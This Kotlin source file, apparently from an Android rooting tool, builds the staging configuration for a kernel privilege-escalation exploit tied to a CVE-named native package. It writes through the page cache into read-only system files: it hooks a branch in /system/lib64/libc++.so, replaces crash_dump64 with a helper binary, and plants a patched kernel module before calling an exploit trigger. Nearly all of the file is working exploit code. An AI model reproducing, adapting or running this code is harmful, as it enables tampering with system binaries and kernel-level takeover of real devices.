package com.ghostlock.app.engine.pagecache.stage

import android.content.Context
import com.ghostlock.app.engine.pagecache.DfrootLibcxx
import com.ghostlock.app.engine.pagecache.ElfTargetReader
import com.ghostlock.app.engine.pagecache.KotlinElfPlanner
import com.ghostlock.app.engine.pagecache.LkmImagePatch
import com.ghostlock.app.engine.pagecache.LkmSelector
import com.ghostlock.app.engine.pagecache.write.BlockWriter
import com.ghostlock.app.jni.cve43284.CarrierCandidates
import com.ghostlock.app.jni.cve43284.NativeHelper
import java.io.RandomAccessFile

data class StageSession(
    val config: StageConfig,
    private val closeAction: () -> Unit,
    private val log: StageLog = silentStageLog,
) : AutoCloseable {
    override fun close() {
        log.verbose("StageSession.close")
        closeAction()
        log.debug("StageSession.close", "done")
    }
}

/** 从 Context/目标 ELF 生产 StageConfig；SA/Writer 生命周期归本对象。 */
object StageConfigProvider {
    private const val TARGET = "/system/lib64/libc++.so"
    private const val CRASH_DUMP = "/apex/com.android.runtime/bin/crash_dump64"

    fun create(
        context: Context,
        carrierPath: String? = null,
        modulePatcher: ((ByteArray) -> ByteArray)? = null,
        log: StageLog = silentStageLog,
    ): StageSession? = runCatching {
        log.verbose("StageConfigProvider.create", "carrierPath" to (carrierPath ?: "auto"),
            "hasPatcher" to (modulePatcher != null))
        val sa = RawSaSession.open(context, log) ?: run {
            log.debug("StageConfigProvider.create", "sa-null")
            return null
        }
        log.debug("StageConfigProvider.create", "sa-open", "spi" to sa.spi, "encap" to sa.encapPort,
            "sender" to sa.senderPort)
        val writer = BlockWriter.open(sa.spi, sa.encapPort, sa.senderPort, log) ?: run {
            log.debug("StageConfigProvider.create", "writer-null")
            sa.close()
            return null
        }
        val scriptFile = com.ghostlock.app.ui.screen.module.backends.FinishScriptStore.scriptFile(context)
        if (!scriptFile.isFile) {
            log.debug("StageConfigProvider.create", "run-script-missing", "path" to scriptFile.absolutePath)
            writer.close(); sa.close(); return null
        }
        val carrier = CarrierCandidates.select(carrierPath, log = log)
        log.debug("StageConfigProvider.create", "carrier", "path" to carrier.path)
        val helper = context.assets.open("splicehelper").use { it.readBytes() }
        log.debug("StageConfigProvider.create", "helper-read", "bytes" to helper.size)
        val moduleRaw = LkmSelector.read(context, log) ?: run {
            log.error("LKM module asset missing", "module-missing")
            log.debug("StageConfigProvider.create", "module-missing")
            writer.close(); sa.close(); return null
        }
        val modulePatched = modulePatcher?.invoke(moduleRaw)
            ?: LkmImagePatch.apply(moduleRaw, scriptFile.absolutePath, log)
        log.debug("StageConfigProvider.create", "module-patched", "bytes" to modulePatched.size)
        val module = modulePatched.copyOf((modulePatched.size + 15) / 16 * 16)
        val target = ElfTargetReader.read(TARGET, log = log) ?: run {
            log.debug("StageConfigProvider.create", "target-missing", "path" to TARGET)
            writer.close(); sa.close(); return null
        }
        val plan = KotlinElfPlanner.plan(target, DfrootLibcxx.bytes(log), log) ?: run {
            log.debug("StageConfigProvider.create", "plan-null")
            writer.close(); sa.close(); return null
        }
        log.debug("StageConfigProvider.create", "plan-ok", "site" to plan.siteFile,
            "landing" to plan.landingFile, "branchWord" to plan.branchWord)
        val payload = DfrootLibcxx.bytes(log).copyOf(DfrootLibcxx.STAGE_SIZE)
        writeLe(payload, DfrootLibcxx.FIRST_INST_OFFSET, plan.displaced, log)
        val jump = KotlinElfPlanner.encodeBranch(
            plan.landingVaddr + DfrootLibcxx.JUMP_BACK_OFFSET,
            plan.siteVaddr + 4,
        ) ?: run {
            log.debug("StageConfigProvider.create", "jump-null")
            writer.close(); sa.close(); return null
        }
        writeLe(payload, DfrootLibcxx.JUMP_BACK_OFFSET, jump, log)
        val ko = carrier.path.toByteArray()
        if (ko.size >= DfrootLibcxx.KO_TARGET_CAPACITY) {
            log.debug("StageConfigProvider.create", "ko-path-too-long", "size" to ko.size)
            writer.close(); sa.close(); return null
        }
        payload.fill(0, DfrootLibcxx.KO_TARGET_OFFSET,
            DfrootLibcxx.KO_TARGET_OFFSET + DfrootLibcxx.KO_TARGET_CAPACITY)
        ko.copyInto(payload, DfrootLibcxx.KO_TARGET_OFFSET)

        val blockStart = plan.siteFile - (plan.siteFile % 16L)
        val siteOriginal = writer.readBlock(TARGET, blockStart) ?: run {
            log.debug("StageConfigProvider.create", "site-read-null", "offset" to blockStart)
            writer.close(); sa.close(); return null
        }
        val stageOriginal = readRange(TARGET, plan.landingFile, DfrootLibcxx.STAGE_SIZE, log)
        val helperOriginal = readRange(CRASH_DUMP, 0, helper.size, log)
        if (stageOriginal == null || helperOriginal == null) {
            log.debug("StageConfigProvider.create", "original-read-null",
                "stage" to (stageOriginal != null), "helper" to (helperOriginal != null))
            writer.close(); sa.close(); return null
        }

        log.debug("StageConfigProvider.create", "originals-ok", "site" to siteOriginal.size,
            "stage" to stageOriginal.size, "helper" to helperOriginal.size,
            "module" to module.size)
        val ledger = RestoreLedger(log)
        ledger.record(TARGET, blockStart, siteOriginal)
        ledger.record(TARGET, plan.landingFile, stageOriginal)
        ledger.record(CRASH_DUMP, 0, helperOriginal)

        var sequence = 1
        val helperSpec = WriteSpec(
            CRASH_DUMP, helper, sa.aesKey, sequence,
            verify = { readRange(CRASH_DUMP, 0, helper.size, log)?.contentEquals(helper) == true },
        )
        sequence += helper.size / 16
        val moduleSpec = WriteSpec(
            carrier.path, module, sa.aesKey, sequence,
            verify = {
                NativeHelper.read(carrier.path, 0L)?.contentEquals(module.copyOf(16)) == true
            },
            viaHelper = true,
        )
        sequence += module.size / 16
        val hookSpec = HookSpec(TARGET, plan, payload, sa.aesKey, sequence) {
            writer.readBlock(TARGET, plan.siteFile - plan.siteFile % 16L)
                ?.let { block ->
                    val at = (plan.siteFile % 16L).toInt()
                    val word = (block[at].toInt() and 0xFF) or
                        ((block[at + 1].toInt() and 0xFF) shl 8) or
                        ((block[at + 2].toInt() and 0xFF) shl 16) or
                        ((block[at + 3].toInt() and 0xFF) shl 24)
                    word == plan.branchWord
                } == true
        }

        val restore: suspend () -> Boolean = {
            log.verbose("StageConfigProvider.restore", "sequence" to sequence)
            val ok = ledger.restore(writer, sa.aesKey, sequence)
            NativeHelper.fadviseDrop(CRASH_DUMP)
            log.debug("StageConfigProvider.restore", "result", "ok" to ok)
            log.verbose("StageConfigProvider.restore.result", "ok" to ok)
            ok
        }

        val config = StageConfig(
            environment = EnvironmentInput("android13-5.15", carrier.path, sa.spi, sa.aesKey, ByteArray(32)),
            block = writer,
            helper = helperSpec,
            module = moduleSpec,
            hook = hookSpec,
            waitPaths = listOf("/dev/df"),
            trigger = { NativeHelper.triggerOrphan(500) },
            restore = restore,
            log = log,
        )
        StageSession(config, { writer.close(); sa.close() }, log)
    }.onFailure { failure ->
        log.error("stage config failed", failure.javaClass.simpleName)
    }.getOrNull()

    private fun readRange(path: String, offset: Long, size: Int, log: StageLog = silentStageLog): ByteArray? {
        log.verbose("StageConfigProvider.readRange", "path" to path, "offset" to offset, "size" to size)
        val out = runCatching {
        RandomAccessFile(path, "r").use { file ->
            file.seek(offset)
            ByteArray(size).also { file.readFully(it) }
        }
        }.getOrNull()
        if (out == null) log.debug("StageConfigProvider.readRange", "failed", "path" to path, "offset" to offset)
        else log.debug("StageConfigProvider.readRange", "ok", "bytes" to out.size)
        return out
    }

    private fun writeLe(bytes: ByteArray, at: Int, value: Int, log: StageLog = silentStageLog) {
        log.debug("StageConfigProvider.writeLe", "write", "at" to at, "value" to value)
        for (index in 0 until 4) bytes[at + index] = ((value ushr (index * 8)) and 0xFF).toByte()
    }
}
